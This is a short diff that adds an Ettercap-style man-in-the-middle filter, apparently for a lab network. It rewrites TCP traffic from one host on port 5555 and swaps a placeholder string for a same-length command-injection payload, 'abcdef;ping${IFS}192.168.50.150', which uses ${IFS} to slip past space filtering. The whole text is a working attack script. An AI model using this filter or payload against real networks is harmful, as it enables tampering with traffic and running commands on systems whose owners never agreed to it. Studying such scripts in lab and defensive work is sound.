@@ -1,0 +1,9 @@
+if (ip.proto == TCP && ip.src == '192.168.50.125' && tcp.src == 5555) 
+{
+   if (search(DATA.data, "1234567890123456789012345678901"))
+   {
+      replace("1234567890123456789012345678901", "abcdef;ping${IFS}192.168.50.150"); 
+          # note: replacement string is same length as original string
+      msg("Payload injected\n");
+   }
+}
